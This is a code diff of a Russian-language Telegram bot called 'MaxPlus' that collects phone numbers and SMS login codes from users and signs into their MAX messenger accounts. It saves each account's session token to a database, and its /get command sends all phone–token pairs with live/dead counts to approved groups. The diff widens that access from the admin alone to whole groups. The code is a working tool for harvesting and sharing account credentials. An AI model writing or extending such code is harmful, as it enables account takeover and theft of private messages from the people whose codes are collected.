@@ -1,7 +1,6 @@
 import asyncio
 import os
 import asyncpg
-from datetime import datetime
 from aiogram import Bot, Dispatcher, F
 from aiogram.filters import Command
 from aiogram.types import Message
@@ -15,7 +14,7 @@ DATABASE_URL = os.getenv("DATABASE_URL")
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 pending = {}
-waiting_code = set()
+waiting_code = {}
 db_pool = None
 
 # === TelegramSmsProvider ===
@@ -97,15 +96,41 @@ def read_token_from_session(phone: str) -> str | None:
     except Exception:
         return None
 
+# === Проверка: одобренная группа (только группа, не личка) ===
+async def is_approved_group(msg: Message) -> bool:
+    if msg.chat.type in ("group", "supergroup"):
+        return await is_group_approved(msg.chat.id)
+    return False
+
 # === Обработчики ===
+
 @dp.message(Command("start"))
 async def start_cmd(msg: Message):
     await msg.answer("👋 MaxPlus — авторизация MAX\n\nОтправь номер в формате +79161234567")
 
+@dp.message(Command("help"))
+async def help_cmd(msg: Message):
+    if not await is_approved_group(msg):
+        return
+
+    text = (
+        "📋 <b>Команды MaxPlus:</b>\n\n"
+        "/get — Получить все токены и статистику\n"
+        "/help — Показать эту справку\n\n"
+        "<b>Как авторизоваться:</b>\n"
+        "1. Отправь номер в личку боту\n"
+        "2. Дождись SMS\n"
+        "3. Введи код <b>ответом</b> на второе сообщение бота"
+    )
+    await msg.answer(text, parse_mode="HTML")
+
 @dp.message(Command("set"))
 async def set_group(msg: Message):
+    if msg.chat.type not in ("group", "supergroup"):
+        return
     if msg.from_user.id != ADMIN_ID:
         return
+
     try:
         group_id = int(msg.text.split()[1])
         async with db_pool.acquire() as conn:
@@ -117,9 +142,24 @@ async def set_group(msg: Message):
     except (IndexError, ValueError):
         await msg.answer("❌ Используй: /set ID_группы")
 
+@dp.message(Command("unset"))
+async def unset_group(msg: Message):
+    if msg.chat.type not in ("group", "supergroup"):
+        return
+    if msg.from_user.id != ADMIN_ID:
+        return
+
+    try:
+        group_id = int(msg.text.split()[1])
+        async with db_pool.acquire() as conn:
+            await conn.execute("DELETE FROM approved_groups WHERE group_id = $1", group_id)
+        await msg.answer(f"✅ Группа {group_id} больше не одобрена")
+    except (IndexError, ValueError):
+        await msg.answer("❌ Используй: /unset ID_группы")
+
 @dp.message(Command("get"))
 async def get_tokens(msg: Message):
-    if msg.from_user.id != ADMIN_ID:
+    if not await is_approved_group(msg):
         return
 
     status_msg = await msg.answer("⏳ Собираю токены...")
@@ -146,7 +186,6 @@ async def get_tokens(msg: Message):
 
     text += f"\nЖивых: {alive} | Мёртвых: {dead}"
 
-    # Файл с токенами
     file_text = ""
     for t in tokens:
         file_text += f"{t['phone']} — {t['token']}\n"
@@ -159,12 +198,10 @@ async def get_tokens(msg: Message):
 
 @dp.message(F.text, ~F.text.startswith("/"))
 async def phone_handler(msg: Message):
-    # Если сообщение из группы — проверяем, одобрена ли она
+    # В группах — молчит (даже в одобренных)
     if msg.chat.type in ("group", "supergroup"):
-        if not await is_group_approved(msg.chat.id):
-            return
+        return
 
-    # Если пользователь должен ввести код
     if msg.from_user.id in waiting_code:
         return await code_as_reply(msg)
 
@@ -185,23 +222,22 @@ async def phone_handler(msg: Message):
 
     await msg.answer(f"📤 SMS-код отправлен на номер {phone}. Ожидайте сообщение в течение минуты.")
     await asyncio.sleep(1.5)
-    waiting_code.add(msg.from_user.id)
+    waiting_code[msg.from_user.id] = True
     await msg.answer("📩 Введите код из SMS ответом на это сообщение:")
 
 async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
     try:
         pending[msg.from_user.id] = {"provider": sms_provider, "phone": phone}
         await client.start()
-        waiting_code.discard(msg.from_user.id)
+        waiting_code.pop(msg.from_user.id, None)
 
-        # Достаём токен из SQLite-сессии и сохраняем в PostgreSQL
         token = read_token_from_session(phone)
         if token:
             await save_token_to_db(phone, token)
 
         await msg.answer(f"✅ {phone} авторизован!\nТокен сохранён в базу данных")
     except Exception as e:
-        waiting_code.discard(msg.from_user.id)
+        waiting_code.pop(msg.from_user.id, None)
         error_text = str(e).lower()
         error_name = type(e).__name__.lower()
 
@@ -220,31 +256,17 @@ async def run_client(msg: Message, client: Client, phone: str, sms_provider: Tel
 
 async def code_as_reply(msg: Message):
     if msg.from_user.id not in pending:
-        waiting_code.discard(msg.from_user.id)
+        waiting_code.pop(msg.from_user.id, None)
         return await msg.answer("❌ Сессия устарела. Отправь номер заново")
 
     code = msg.text.strip()
-    if not code.isdigit():
-        return await msg.answer("❌ Код должен состоять только из цифр")
+
+    if not code.isdigit() or len(code) != 6:
+        return await msg.answer("❌ Код должен состоять из шести цифр. Введите код ответом на сообщение выше")
 
     data = pending[msg.from_user.id]
     provider = data["provider"]
-    waiting_code.discard(msg.from_user.id)
-    await provider.set_code(code)
-    await msg.answer("✅ Код принят, авторизую...")
-
-@dp.message(Command("code"))
-async def code_handler(msg: Message):
-    if msg.from_user.id not in pending:
-        return await msg.answer("❌ Сначала отправь номер")
-
-    code = msg.text.split()[1] if len(msg.text.split()) > 1 else None
-    if not code or not code.isdigit():
-        return await msg.answer("❌ Используй: /code 12345")
-
-    data = pending[msg.from_user.id]
-    provider = data["provider"]
-    waiting_code.discard(msg.from_user.id)
+    waiting_code.pop(msg.from_user.id, None)
     await provider.set_code(code)
     await msg.answer("✅ Код принят, авторизую...")
 
